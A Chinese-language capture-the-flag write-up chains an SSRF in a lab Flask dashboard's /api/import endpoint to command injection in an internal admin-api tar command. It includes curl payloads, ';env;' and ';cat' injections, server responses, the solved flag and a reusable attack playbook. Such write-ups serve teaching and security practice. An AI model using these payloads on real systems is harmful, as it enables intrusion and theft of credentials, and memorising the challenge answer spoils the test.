# Case Study: a-14 SSRF → admin-api RCE

**状态**: ✅ 已通 (2026-08-12 22:57)
**分数**: +300
**最终 flag**: `flag{3dfaf3d2-d0f7-404e-b8ee-243f3e7f8e32}`

---

## 题目

- **容器**: `http://10.0.175.27:80` (Flask/Werkzeug 3.1.8 / Python 3.9.25)
- **题目名**: "Smart Logistics Dashboard"（全球包裹追踪看板）
- **关键描述**:
  - "集成了外部数据导入功能" → SSRF 入口
  - "内网部署了诊断工具,配置疏忽可外部访问" → admin-api:5000 内网服务
  - "请获取系统最高权限并读取凭证"

## 攻击链(5 步)

### Step 1: 探 `/api/services/status` 泄露内网服务清单

```bash
curl -s http://10.0.175.27:80/api/services/status
```

返回关键信息:
- **Partner Sync Service**: `http://admin-api:5000/api/v2/fetch`
- **Log Archive Tool**: `http://admin-api:5000/api/internal/archive?service=web&filename={name}` (标注 Restricted,filename 疑似文件读取/路径穿越入口)

### Step 2: 找 SSRF 入口 `/api/import`

```bash
# 试 50+ 扁平键名都失败,最后试嵌套对象
curl -s -X POST http://10.0.175.27:80/api/import \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://example.com"}'  # ← 试 url 键,返回 {error:URL is required}
curl -s -X POST http://10.0.175.27:80/api/import \
  -H 'Content-Type: application/json' \
  -d '{"target_endpoint":"http://example.com"}'  # ← 真正参数名
```

返回:
```json
{"data_preview":"<!doctype html>...","source":"http://example.com/","status":"success"}
```

**关键**: SSRF 参数叫 `target_endpoint`(不是 `url`)。还有黑名单:`127.0.0.1` 被拦截。

### Step 3: SSRF 到 admin-api:5000 调 Log Archive

```bash
curl -s -X POST http://10.0.175.27:80/api/import \
  -H 'Content-Type: application/json' \
  -d '{"target_endpoint":"http://admin-api:5000/api/internal/archive?service=web&filename=test"}'
```

返回:
```json
{
  "partner_response": {
    "command": "tar -czf /tmp/test.gz /var/log/sync/web.log 2>&1",
    "output": "tar: Removing leading `/' from member names\n",
    "status": "Task triggered"
  }
}
```

**关键发现**: `filename` 直接拼到 shell 命令 `tar -czf /tmp/{filename}.gz /var/log/sync/web.log`!
- 可用 `;` 注入任意命令

### Step 4: 命令注入读 env 找 flag 路径

```bash
curl -s -X POST http://10.0.175.27:80/api/import \
  -H 'Content-Type: application/json' \
  -d '{"target_endpoint":"http://admin-api:5000/api/internal/archive?service=web&filename=a%3Benv%3Bb"}'
```

`%3B` = `;`,实际命令变成:
```bash
tar -czf /tmp/a;env;b.gz /var/log/sync/web.log
```

**响应**:
```
HOSTNAME=1d4b7c5ff4ac
HOME=/root
...
DYNAMIC_FLAG_PATH=/tmp/flags/tsec-task_ljpv9adapf37-a-14_flag_1
/bin/sh: 1: b.gz: not found
```

**关键**: env 里有 `DYNAMIC_FLAG_PATH` 暴露 flag 真实路径!

### Step 5: 读 flag

```bash
curl -s -X POST http://10.0.175.27:80/api/import \
  -H 'Content-Type: application/json' \
  -d '{"target_endpoint":"http://admin-api:5000/api/internal/archive?service=web&filename=a%3Bcat+%2Fchallenge%2Fflag.txt%3Bb"}'
```

**响应**:
```json
{
  "partner_response": {
    "command": "tar -czf /tmp/a;cat /challenge/flag.txt;b.gz /var/log/sync/web.log",
    "output": "flag{3dfaf3d2-d0f7-404e-b8ee-243f3e7f8e32}\n/bin/sh: 1: b.gz: not found",
    "status": "Task triggered"
  }
}
```

🎯 **flag 拿到**!

## 时间线

| 时间 | 事件 |
|---|---|
| 22:51:58 | solver 启动,看 knowledge |
| 22:52:11 | 探首页 + /api/services/status → 拿到 admin-api:5000 服务清单 |
| 22:52:23 | 试 /api/import 50+ 键名,失败 |
| 22:52:33 | 试 target_endpoint 嵌套对象,**SSRF 入口打通** |
| 22:52:46 | 试 SSRF 到 admin-api:5000 → 拿到 tar 命令响应 |
| 22:56:07 | 试 `filename=a;env;b` → 拿到 DYNAMIC_FLAG_PATH |
| 22:56:48 | 试 `filename=a;cat /challenge/flag.txt;b` → **flag 拿到** |
| 22:57:05 | 提交平台,返回 duplicate(已正确提交) |

**总耗时**: 5 分钟(solver 启动后)

## 关键洞察

1. **`/api/services/status` 是金矿** — 直接泄露内网架构和服务地址
2. **参数名 ≠ 常见命名** — 是 `target_endpoint` 不是 `url`/`uri`/`image`,要试嵌套对象
3. **命令注入到 tar** — `filename` 拼到 shell 命令,可用 `;` 注入
4. **env 暴露 flag 路径** — 平台把 `DYNAMIC_FLAG_PATH` 写在环境变量里
5. **/challenge/flag.txt 是标准位置** — 不一定按 DYNAMIC_FLAG_PATH 走,先试这个

## 失败路径(避坑)

| 尝试 | 结果 |
|---|---|
| 50+ 扁平键名 (`url`/`uri`/`image`/`feed` 等) | 全部 `{error:URL is required}` |
| 127.0.0.1 直连 | "Security restriction: Access to 127.0.0.1 is blocked" |
| 公网直接调 `/api/internal/archive` | 404(只在 admin-api:5000 内网) |
| `filename=../etc/passwd`(路径穿越) | 拼到 tar 命令里,实际只影响 tar 的源文件路径,不返回内容 |
| `filename=$(env)` (命令替换) | 可能没试,但 `;env;` 更直接 |

## 通用打法(Spring Boot / Flask + 内网 admin-api SSRF)

```
1. curl /api/services/status → 找 admin-api / actuator / prometheus 等
2. 试 /api/import /api/fetch /api/preview 的常见 + 嵌套参数名
3. SSRF 到 admin-api → 找 Log Archive / File Read / Internal 端点
4. filename/path 参数试 `;cmd;` 注入
5. 先 `;env;` 找 FLAG_PATH,再 `;cat /flag/path;`
```

## 关键词

`#ssrf` `#admin-api` `#log-archive` `#command-injection` `#tar-injection` `#filename` `#target_endpoint` `#werkzeug`
